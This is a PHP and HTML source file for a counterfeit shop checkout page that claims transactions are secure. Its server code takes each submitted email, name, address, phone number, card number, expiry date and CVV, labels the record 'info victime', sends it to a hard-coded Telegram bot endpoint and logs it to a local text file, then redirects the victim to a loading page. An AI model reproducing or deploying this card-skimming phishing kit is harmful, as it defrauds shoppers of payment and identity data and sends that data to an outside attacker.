<?php
session_start();

      
if(  isset($_POST["order"])  )
{	
	
	foreach($_SESSION["infocookiess1"] as $keys => $values)
    {	
	    $datetime=$values["datetime"];
		$ip=$values["ip"];
		$id=$values["id"];
		$img=$values["img"];
		$title=$values["title"];
		$price=$values["price"];
		$quantity=$values["quantity"];
		$color=$values["color"];

		$email = $_POST["email"];
		$firstname = $_POST["firstname"];
		$lastname = $_POST["lastname"];
		$address = $_POST["address"];
		$city = $_POST["city"];
		$country = $_POST["country"];
		$postcode = $_POST["postcode"];
		$phone = $_POST["phone"];
		$nameoncard = $_POST["nameoncard"];
		$cardnumber = $_POST["cardnumber"];
		$expmm = $_POST["expmm"];
		$expyy = $_POST["expyy"];
		$cvv = $_POST["cvv"];		
    }
	

	$_SESSION["infocookiess2"][] = array 
	(  
		'datetime' => $datetime,
		'ip' => $ip,
		'id' => $id,   
		'img' => $img,  	
        'title' => $title,
        'price' => $price, 
        'quantity' => $quantity,
		'color' => $color,
		'email' => $email,
		'firstname' => $firstname,
		'lastname' => $lastname,
		'address' => $address,
		'city' => $city,
		'country' => $country,
		'postcode' => $postcode,
		'phone' => $phone,
		'nameoncard' => $nameoncard,
		'cardnumber' => $cardnumber,
		'expmm' => $expmm,
		'expyy' => $expyy,
		'cvv' => $cvv,		
	); 
	
             
	define ('url',"https://api.telegram.org/bot1865501764:AAE6Ep51dlBHRa8ZSk0csxOxrBc1IHJocTw/sendmessage?chat_id=1335982188&");
    $message = urlencode
	(   
		"\n /-- start info victime --/"                               . 
		"\n datetime: "               .   $datetime                   .  		                 
		"\n ip: "                     .   $ip                         .  
        "\n img: "                    .   $img                        .  
		"\n title: "                  .   $title                      .
		"\n price: "                  .   $price                      .
		"\n quantity: "               .   $quantity                   .
		"\n color: "                  .   $color                      .
		"\n email: "                  .   $email                      .
		"\n fulname: "                .   $firstname ." ". $lastname  .
		"\n address: "                .   $address                    .
		"\n city: "                   .   $city                       .
		"\n country: "                .   $country                    .
		"\n postcode: "               .   $postcode                   .
		"\n phone: "                  .   $phone                      .
		"\n nameoncard: "             .   $nameoncard                 .
		"\n cardnumber: "             .   $cardnumber                 .
		"\n expdate: "                .   $expmm ."/". $expyy  	      .
		"\n cvv: "                    .   $cvv   		              .
		"\n /-- end info victime --/"                                         		
	);
    file_get_contents(url."text=".$message."");
 
			
    $file = Fopen("infovictime.txt","a+"); 
    fwrite($file ,    "\n /-- star info victime --/"                                  );
	fwrite($file ,    "\n datetime : "            .      $datetime                    ); 
    fwrite($file ,    "\n ip : "                  .      $ip                          ); 
	fwrite($file ,    "\n img : "                 .      $img                         );
	fwrite($file ,    "\n title : "               .      $title                       ); 
	fwrite($file ,    "\n price : "               .      $price                       ); 
	fwrite($file ,    "\n quantity : "            .      $quantity                    ); 
	fwrite($file ,    "\n color : "               .      $color                       ); 
	fwrite($file ,    "\n email : "               .      $email                       ); 
	fwrite($file ,    "\n fulname : "             .      $firstname ." ". $lastname   ); 
	fwrite($file ,    "\n address : "             .      $address                     ); 
	fwrite($file ,    "\n city : "                .      $city                        ); 
	fwrite($file ,    "\n country : "             .      $country                     ); 
	fwrite($file ,    "\n postcode : "            .      $postcode                    ); 
	fwrite($file ,    "\n phone : "               .      $phone                       ); 
	fwrite($file ,    "\n nameoncard : "          .      $nameoncard                  ); 
	fwrite($file ,    "\n cardnumber : "          .      $cardnumber                  ); 
	fwrite($file ,    "\n expdate : "             .      $expmm ."/". $expyy          ); 	
	fwrite($file ,    "\n cvv : "                 .      $cvv                         ); 	
    fwrite($file ,    "\n /-- end info victime --/"                                   );  
    fwrite($file ,    "\n"                                                            );     
	 

    echo "<script> window.location.href = 'loading.php'; </script>"; 

}

?>

<title>Welcome</title>
<meta charset="utf-8">   <meta http-equiv="X-UA-Compatible" content="IE=edge"/>  <meta http-equiv="origin-trial" content=""/>  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"/>     
<script type="text/javascript"  src="https://code.jquery.com/jquery-3.5.1.min.js"></script> 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"/>  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"/>   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css"/>   <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"      ></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css"  rel="stylesheet"  > <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js" ></script>  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js" ></script>  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.min.js" ></script>
<link rel="shortcut icon" type="image/x-icon" media="all" href="" />
<style>html, body{ background-color:#fafafa;  padding:0; border:0; margin:0% 0%;  touch-action: manipulation;    user-select: none;   }   ul li {list-style-type:none; text-decoration:none;  }  a{text-decoration:none; }    </style>




<style>
.container1 {width:100%; height:auto; }


	.row1{ padding:0% 0%; margin:0% 0%;    display:flex; align-items:flex-start;  align-content:center; justify-content:center; text-align:center; grid-column-gap:0.4rem; }       
        .row1 .col1a{width:60%; }   .row1 .col1b{background-color:white;   padding:0px 0px; margin:0% 0%;    display:flex; align-items:center; justify-content:center; text-align:center;   }
            .shipping{margin:5% 0%;  display: grid; align-items: center;  align-content: center; justify-content: center; justify-items: stretch; }
                .logoshipping{ padding-bottom: 10px; border-bottom: 1px solid #e5e5e5;   color:black; font:600 30px 'cairo';} .logoshipping img{max-width:100%; width:300px;}
				.infoproductmobile{ background-color: #f7f7f7; margin:2% 0%;   border: solid 1px #e1d7e3;  display:none;  align-items:center; justify-content:center; text-align:center; grid-row-gap:1rem;}
					.imgtitleprice{ padding-bottom: 10px; border-bottom: 1px solid #e5e5e5;  display: flex;  align-items: center;  align-content: center; justify-content: center; text-align: center; flex-wrap: nowrap;  flex-direction: row; grid-column-gap:1rem;}
						.imgtitleprice .img1{ width:50px; } 	
						.imgtitleprice .title{ color:black; font:800 15px 'cairo';} 
						.imgtitleprice .price{ color:black; font:800 20px 'cairo';} 				  
					.subtotalandshipping{padding-bottom: 10px; border-bottom: 1px solid #e5e5e5;  }
					    .subtotalandshipping .quantity{ display: flex; align-items: flex-start; justify-content: space-between; text-align: center;  }
						.subtotalandshipping .subtotal{ display: flex; align-items: flex-start; justify-content: space-between; text-align: center;  }
						.subtotalandshipping .shipping{ display: flex; align-items: flex-start; justify-content: space-between; text-align: center;}
					.total{display: flex; align-items: flex-start; justify-content: space-between; text-align: center;}
				.form1{background-color:transparent;  padding:20px;  border:solid 0px white; border-radius:0px;  box-shadow: 0 0 10px transparent;           } 	 
					.contactinformation {text-align:left; color:black; font:800 20px 'cairo';}
					.shippingadress{text-align:left; color:black; font:800 20px 'cairo';}
                    .payment1{text-align:left; color:black; font:800 20px 'cairo';}  .payment2{text-align:left; color:black; font:500 12px 'cairo';}
                    .poscreditcard{background-color: #fafafa; width:100%; padding:20px; margin:0px; border:solid 2px #d9d9d9; border-radius:0px;   }	
		              .creditcard{ margin:3px 0px; color:black; font:400 17px 'cairo';  display: flex; align-items: flex-start; justify-content: space-between; text-align:left;  grid-row-gap:0.3rem; } 
					.inputtext{background-color:white; width:100%;  height: 45px;  padding:0px 10px;  margin:10px 0px;    border: solid 1px  #dfe4ea; border-radius:5px;  box-shadow:0; outline:none;       color: #495057; font:200 20px 'cairo';   }     						.inputtext:focus{ border:solid 2px #a4b0be;   box-shadow:0; outline:none;  }       				 .inputtext::placeholder {color:#00000085;  font:400 18px 'cairo';} 							    		
					.inputsubmit {background-color:#0f88a7;  width:100%; height:45px; margin:4% 0% 0% 0%;  border:0; border-radius:5px; box-shadow:0;   color:white; font:600 15px 'cairo'; text-transform: uppercase;  text-decoration:none;   cursor:pointer; display:flex; align-items:center;  justify-content:center; text-align:center; }                   .inputsubmit:hover{background-color:#0f88a7;} 

		
        .row1 .col2a{width:40%; }   .row1 .col2b{ padding:0px 0px; margin:0% 0%;    display:grid; align-items:flex-start; justify-content:center; text-align:center;   }
            .infoproduct{ margin:10% 0%; display:grid; align-items:center; justify-content:center; text-align:center; grid-row-gap:1rem;}
				.imgtitleprice{ padding-bottom: 10px; border-bottom: 1px solid #e5e5e5;  display: flex;  align-items: center;  align-content: center; justify-content: center; text-align: center; flex-wrap: nowrap;  flex-direction: row; grid-column-gap:1rem;}
					.imgtitleprice .img1{ width:50px; } 	
					.imgtitleprice .title{ color:black; font:800 15px 'cairo';} 
					.imgtitleprice .price{ color:black; font:800 20px 'cairo';} 				  
				.subtotalandshipping{padding-bottom: 10px; border-bottom: 1px solid #e5e5e5;  }
					.subtotalandshipping .quantity{ display: flex; align-items: flex-start; justify-content: space-between; text-align: center;  }
					.subtotalandshipping .subtotal{ display: flex; align-items: flex-start; justify-content: space-between; text-align: center;  }
					.subtotalandshipping .shipping{ display: flex; align-items: flex-start; justify-content: space-between; text-align: center;}
				.total{display: flex; align-items: flex-start; justify-content: space-between; text-align: center;}



@media only screen and (max-width:1000px) 
{  

.row1{display:grid; }
  .row1 .col1a{width:100%;  }
     .logoshipping{  padding-bottom: 10px; border-bottom:solid  0px  #e5e5e5;  color:black; font:600 30px 'cairo';}
     .infoproductmobile{ display:grid;}  
  .row1 .col2a{ display:none; }      

}
	



@media only screen and (max-width:600px) 
{  

}	

@media only screen and (max-width:400px)  
{
	.creditcard{display:grid; text-align:center;   }

}
	
</style>


<form method="post" action="" style="padding:0px; margin:0px;"  onsubmit=" return validinputjs()">  
<div class="container1">
  
  

  
	<div class="row1">
	    <div class="col1a">  <div class="col1b">	
		    <div class="shipping" >
			
				<div class="logoshipping"><img src="img/logo.png" class="logo"  /></div>
				
					<?php	
                    $totalitem = 0;					
					$totalpricee = 0;
					if(!empty($_SESSION["infocookiess1"]))
					{
							foreach($_SESSION["infocookiess1"] as $keys => $values)
							{
								$id =  $values["id"];
								$img =  $values["img"];
								$title =  $values["title"];
								$price = (int)$values["price"]; 	
								$quantity =  $values["quantity"];
								$color =  $values["color"];
								$subtotal = number_format(  $quantity * $price  , 2 ) ; 
								
								$totalitem = $totalitem + 1;	
			
			                    $subtotall =  $quantity * $price   ; 
			                    $totalpricee = $totalpricee  + $subtotall   ; 
			                    $totalprice= number_format( $totalpricee,  2);
	

								?>
								<div class="infoproductmobile" >
											<div class="imgtitleprice" >
												<img class="img1" src="<?php echo $img; ?>"  style="width:60px; height:60px;" >   
												<div class="title"> <?php echo $title?> </div>  
												<div class="price"> <?php echo $price ?>€ </div> 
											</div>
											<div class="subtotalandshipping" >
											    <div class="quantity" >   <div>Quantity</div>   <div><?php echo $quantity ?></div>  </div> 
												<div class="subtotal" >   <div>Subtotal</div>   <div><?php echo $subtotal ?>€</div>  </div> 
												<div class="shipping" >   <div>Shipping</div>   <div>free</div>  </div>  
											</div>
											<div class="total" >  <div>Total</div>  <div><?php echo $totalprice ?>€ </div>   </div>							  
								</div>	
								<?php
							}					
					}
					?>	


		  
				<div class="form1" >                              
						<div class="contactinformation">Contact information</div>				
						  <div>  <input type="email"     placeholder="Email"             name="email"       class="inputtext"          oninvalid="this.setCustomValidity('Vous devez entrer votre Email ')"   oninput="setCustomValidity('')"         required />  </div>
						<div class="shippingadress">Shipping address</div>
							<div> 
								<div style="display:flex; grid-column-gap:0.2rem;">  
									<input    type="text"    placeholder="First name"         name="firstname"             class="inputtext"   oninvalid="this.setCustomValidity('Enter a valid first name ')"   oninput="setCustomValidity('')"          required   />  
									<input    type="text"    placeholder="Last name"         name="lastname"             class="inputtext"    oninvalid="this.setCustomValidity('Enter a valid Last name ')"    oninput="setCustomValidity('')"          required  />  
								</div> 
							</div> 						
							<div>  <input type="text"     placeholder="Address"         name="address"       class="inputtext"          oninvalid="this.setCustomValidity('Enter a valid Address ')"   oninput="setCustomValidity('')"        required  />  </div>
							<div>  <input type="text"     placeholder="City"           name="city"         class="inputtext"          oninvalid="this.setCustomValidity('Enter a valid City ')"     oninput="setCustomValidity('')"        required  />  </div>
							<div> 
								<div style="display:flex; grid-column-gap:0.2rem;">  
									<input    type="text"    placeholder="Country"            name="country"             class="inputtext"    oninvalid="this.setCustomValidity('Enter a valid Country ')"        oninput="setCustomValidity('')"       required />  
									<input    type="number"    placeholder="Postcode"          name="postcode"             class="inputtext"    oninvalid="this.setCustomValidity('Enter a valid Postcode ')"    oninput="setCustomValidity('')"        required    />  
								</div> 
							</div>
							<div>  <input type="number"   placeholder="Phone"                 name="phone"           class="inputtext"         oninvalid="this.setCustomValidity('Enter a valid Phone ')"     oninput="setCustomValidity('')"       required  />  </div> 
						<div class="payment1">Payment</div>
						<div class="payment2"> All transactions are secure and encrypted. </div>
                            <div class="poscreditcard">
								<div class="creditcard"><div> Credit card </div> <div> <img src="img/visacard.jpg">  </div> </div> 
								<div>  <input type="text"     placeholder="Name on card"       name="nameoncard"    class="inputtext"          oninvalid="this.setCustomValidity('Enter a valid Name on card ')"    oninput="setCustomValidity('')"       required />  </div>
								<div>  <input type="number"  placeholder="Card number"    name="cardnumber"   id="cardnumberjs"   class="inputtext" oninvalid="this.setCustomValidity('Enter a valid Card number ')"    oninput="setCustomValidity('')"        onKeyPress="if(this.value.length==16) return false;"    pattern="[0-9]{16}"    required    /> </div>    <div id="error" ></div>
								<div> 
									<div style="display:flex; grid-column-gap:0.2rem;">  
										<input    type="number"    placeholder="MM"            name="expmm"             class="inputtext"    oninvalid="this.setCustomValidity('Enter a valid MM ')"     oninput="setCustomValidity('')"          onKeyPress="if(this.value.length==2) return false;"   pattern="[0-9]{2}"   required />  
										<input    type="number"    placeholder="YYYY"           name="expyy"             class="inputtext"    oninvalid="this.setCustomValidity('Enter a valid YY ')"    oninput="setCustomValidity('')"           onKeyPress="if(this.value.length==4) return false;"  pattern="[0-9]{4}"   required /> 
									</div> 
								</div> 			
								<div>  <input type="number"     placeholder="Security code"      name="cvv"           class="inputtext"        oninvalid="this.setCustomValidity('Your card's security code is incomplete ')"                oninput="setCustomValidity('')"      onKeyPress="if(this.value.length==3)  return false;"  pattern="[0-9]{3}" required  />  </div>				          
                           </div>
						<div>  <input type="submit"         value="Complete order "   name="order"      class="inputsubmit" />  </div>			   					

                </div>
            </div>				 
		</div> </div>
		<div class="col2a">  <div class="col2b">
					<?php	
                    $totalitem = 0;					
					$totalpricee = 0;
					if(!empty($_SESSION["infocookiess1"]))
					{
							foreach($_SESSION["infocookiess1"] as $keys => $values)
							{
								$id =  $values["id"];
								$img =  $values["img"];
								$title =  $values["title"];
								$price = (int)$values["price"]; 	
								$quantity =  $values["quantity"];
								$color =  $values["color"];
								$subtotal = number_format(  $quantity * $price  , 2 ) ; 
								
								$totalitem = $totalitem + 1;	
			
			                    $subtotall =  $quantity * $price   ; 
			                    $totalpricee = $totalpricee  + $subtotall   ; 
			                    $totalprice= number_format( $totalpricee,  2);
	

								?>
								<div class="infoproduct" >
											<div class="imgtitleprice" >
												<img class="img1" src="<?php echo $img; ?>"  style="width:60px; height:60px;" >   
												<div class="title"> <?php echo $title?> </div>  
												<div class="price"> <?php echo $price ?>€ </div> 
											</div>
											<div class="subtotalandshipping" >
											    <div class="quantity" >   <div>Quantity</div>   <div><?php echo $quantity ?></div>  </div> 
												<div class="subtotal" >   <div>Subtotal</div>   <div><?php echo $subtotal ?>€</div>  </div> 
												<div class="shipping" >   <div>Shipping</div>   <div>free</div>  </div>  
											</div>
											<div class="total" >  <div>Total</div>  <div><?php echo $totalprice ?>€ </div>   </div>							  
								</div>	
								<?php
							}					
					}
					?>	






</div>
</form>  





